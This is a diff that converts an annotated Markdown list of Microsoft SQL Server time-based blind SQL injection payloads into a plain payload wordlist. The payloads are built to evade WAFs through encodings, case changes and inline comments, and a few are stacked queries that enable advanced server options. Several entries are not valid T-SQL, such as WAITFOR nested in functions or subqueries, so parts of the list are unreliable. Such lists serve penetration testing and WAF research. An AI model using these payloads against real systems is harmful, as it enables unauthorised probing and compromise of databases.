@@ -1,103 +1,49 @@
-# Microsoft SQL Server
-
-These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.
-
-- **' AND WAITFOR DELAY '0:0:5' --**  
-  Standard WAITFOR 5-second delay.
-- **'; WAITFOR DELAY '0:0:5' --**  
-  Semicolon stacked WAITFOR.
-- **' AND IF(1=1,WAITFOR DELAY '0:0:5',0) --**  
-  IF conditional WAITFOR.
-- **' aNd WaItFoR dElAy '0:0:5' --**  
-  Case variation WAITFOR.
-- **'/*comment*/AND/*comment*/WAITFOR DELAY '0:0:5' --**  
-  Inline comments WAITFOR.
-- **%27%20AND%20WAITFOR%20DELAY%20%270:0:5%27%20--**  
-  URL-encoded WAITFOR.
-- **%2527%20AND%20WAITFOR%20DELAY%20%270:0:5%27%20--**  
-  Double URL WAITFOR.
-- **\u0027 AND WAITFOR DELAY \u00270:0:5\u0027 --**  
-  Unicode WAITFOR.
-- **' AND WAIT FOR DELAY '0:0:5' --**  
-  Spaced WAITFOR.
-- **' OR WAITFOR DELAY '0:0:5' --**  
-  OR WAITFOR delay.
-- **' UNION SELECT WAITFOR DELAY '0:0:5' --**  
-  UNION WAITFOR.
-- **' HAVING WAITFOR DELAY '0:0:5' --**  
-  HAVING WAITFOR.
-- **' ORDER BY WAITFOR DELAY '0:0:5' --**  
-  ORDER BY WAITFOR.
-- **' GROUP BY WAITFOR DELAY '0:0:5' --**  
-  GROUP BY WAITFOR.
-- **' AND (SELECT COUNT(*) FROM sysobjects a, sysobjects b) --**  
-  Sysobjects cross-join count.
-- **' AND WAITFOR/* */DELAY '0:0:5' --**  
-  Comment in function.
-- **' AND WAITFOR DELAY '0 : 0 : 5' --**  
-  Spaced time param.
-- **' AND WAITFOR DELAY '0:0:5'--+**  
-  Plus comment WAITFOR.
-- **' AND WAITFOR DELAY '0:0:5'#**  
-  Hash comment WAITFOR.
-- **' OR IF(1=1,WAITFOR DELAY '0:0:5',0) --**  
-  OR conditional WAITFOR.
-- **%27%20OR%20WAITFOR%20DELAY%20%270:0:5%27%20--**  
-  URL OR WAITFOR.
-- **' AND 1=CONVERT(int,WAITFOR DELAY '0:0:5') --**  
-  CONVERT nested WAITFOR.
-- **' EXEC('WAITFOR DELAY ''0:0:5''') --**  
-  EXEC dynamic WAITFOR.
-- **' AND WAITFOR DELAY concat('0:0:',5) --**  
-  CONCAT time param.
-- **' AND WAITFOR DELAY '0:0:5' AND '1'='1**  
-  Chained WAITFOR.
-- **' UNION ALL SELECT WAITFOR DELAY '0:0:5' --**  
-  UNION ALL WAITFOR.
-- **' AND (WAITFOR DELAY '0:0:5') IS NULL --**  
-  IS NULL WAITFOR.
-- **'; DECLARE @x CHAR(9);SET @x='DELAY 0:0:5'; WAITFOR @x --**  
-  Variable dynamic delay.
-- **' AND 1=(SELECT WAITFOR DELAY '0:0:5') --**  
-  Subselect WAITFOR.
-- **\u0027\u0020AND\u0020WAITFOR\u0020DELAY\u0020\u00270:0:5\u0027\u0020--**  
-  Unicode spaced WAITFOR.
-- **' AND WAITFOR DELAY/*comment*/'0:0:5' --**  
-  Param comment WAITFOR.
-- **' AND WAITFOR DELAY '0:0:5' /*' or WAITFOR DELAY '0:0:5' or '" or WAITFOR DELAY '0:0:5' or "*/**  
-  Multi-comment bypass.
-- **' AND (SELECT * FROM (WAITFOR DELAY '0:0:5')a) --**  
-  Nested subquery WAITFOR.
-- **%27+AND+WAITFOR+DELAY+'0:0:5'+--**  
-  Plus-space variant.
-- **' AND WAITFOR TIME '12:00:00' --**  
-  TIME-based WAITFOR.
-- **' AND 1=DBCC USEROPTIONS(WAITFOR DELAY '0:0:5') --**  
-  DBCC nested WAITFOR.
-- **' BEGIN WAITFOR DELAY '0:0:5'; END --**  
-  Block WAITFOR.
-- **' PRINT WAITFOR DELAY '0:0:5' --**  
-  PRINT nested.
-- **' AND WAITFOR DELAY '00:00:05' --**  
-  Alternative time format.
-- **' AND WAITFOR DELAY '0:00:5' --**  
-  Short time format.
-- **' AND master..xp_dirtree '\\WAITFOR DELAY '0:0:5'' --**  
-  XP_DIRTREE nested.
-- **' AND 1= (SELECT COUNT(*) FROM master.sysobjects AS t1,master.sysobjects AS t2) --**  
-  Master objects cross-join.
-- **';WAITFOR DELAY'0:0:5'--**  
-  Semicolon no space.
-- **' OR WAITFOR DELAY'0:0:5'--**  
-  OR no space.
-- **%2527%20OR%20WAITFOR%20DELAY%25270:0:5%2527--**  
-  Double URL OR.
-- **' AND (SELECT COUNT(*) FROM sys.columns c1, sys.columns c2) --**  
-  Columns cross-join.
-- **' AND WAITFOR DELAY '0:0:10' --**  
-  Longer 10-second delay.
-- **' EXEC sp_configure 'show advanced options', 1; RECONFIGURE; WAITFOR DELAY '0:0:5' --**  
-  Config stacked delay.
-- **' AND @@version LIKE WAITFOR DELAY '0:0:5' --**  
-  LIKE nested WAITFOR.
-
+' AND WAITFOR DELAY '0:0:5' --
+'; WAITFOR DELAY '0:0:5' --
+' AND IF(1=1,WAITFOR DELAY '0:0:5',0) --
+' aNd WaItFoR dElAy '0:0:5' --
+'/comment/AND/comment/WAITFOR DELAY '0:0:5' --
+%27%20AND%20WAITFOR%20DELAY%20%270:0:5%27%20--
+%2527%20AND%20WAITFOR%20DELAY%20%270:0:5%27%20--
+\u0027 AND WAITFOR DELAY \u00270:0:5\u0027 --
+' AND WAIT FOR DELAY '0:0:5' --
+' OR WAITFOR DELAY '0:0:5' --
+' UNION SELECT WAITFOR DELAY '0:0:5' --
+' HAVING WAITFOR DELAY '0:0:5' --
+' ORDER BY WAITFOR DELAY '0:0:5' --
+' GROUP BY WAITFOR DELAY '0:0:5' --
+' AND (SELECT COUNT(*) FROM sysobjects a, sysobjects b) --
+' AND WAITFOR/* */DELAY '0:0:5' --
+' AND WAITFOR DELAY '0 : 0 : 5' --
+' AND WAITFOR DELAY '0:0:5'--+
+' AND WAITFOR DELAY '0:0:5'#
+' OR IF(1=1,WAITFOR DELAY '0:0:5',0) --
+%27%20OR%20WAITFOR%20DELAY%20%270:0:5%27%20--
+' AND 1=CONVERT(int,WAITFOR DELAY '0:0:5') --
+' EXEC('WAITFOR DELAY ''0:0:5''') --
+' AND WAITFOR DELAY concat('0:0:',5) --
+' AND WAITFOR DELAY '0:0:5' AND '1'='1
+' UNION ALL SELECT WAITFOR DELAY '0:0:5' --
+' AND (WAITFOR DELAY '0:0:5') IS NULL --
+'; DECLARE @x CHAR(9);SET @x='DELAY 0:0:5'; WAITFOR @x --
+' AND 1=(SELECT WAITFOR DELAY '0:0:5') --
+\u0027\u0020AND\u0020WAITFOR\u0020DELAY\u0020\u00270:0:5\u0027\u0020--
+' AND WAITFOR DELAY/comment/'0:0:5' --
+' AND WAITFOR DELAY '0:0:5' /' or WAITFOR DELAY '0:0:5' or '" or WAITFOR DELAY '0:0:5' or "/
+' AND (SELECT * FROM (WAITFOR DELAY '0:0:5')a) --
+%27+AND+WAITFOR+DELAY+'0:0:5'+--
+' AND WAITFOR TIME '12:00:00' --
+' AND 1=DBCC USEROPTIONS(WAITFOR DELAY '0:0:5') --
+' BEGIN WAITFOR DELAY '0:0:5'; END --
+' PRINT WAITFOR DELAY '0:0:5' --
+' AND WAITFOR DELAY '00:00:05' --
+' AND WAITFOR DELAY '0:00:5' --
+' AND master..xp_dirtree '\WAITFOR DELAY '0:0:5'' --
+' AND 1= (SELECT COUNT(*) FROM master.sysobjects AS t1,master.sysobjects AS t2) --
+';WAITFOR DELAY'0:0:5'--
+' OR WAITFOR DELAY'0:0:5'--
+%2527%20OR%20WAITFOR%20DELAY%25270:0:5%2527--
+' AND (SELECT COUNT(*) FROM sys.columns c1, sys.columns c2) --
+' AND WAITFOR DELAY '0:0:10' --
+' EXEC sp_configure 'show advanced options', 1; RECONFIGURE; WAITFOR DELAY '0:0:5' --
+' AND @@version LIKE WAITFOR DELAY '0:0:5' --
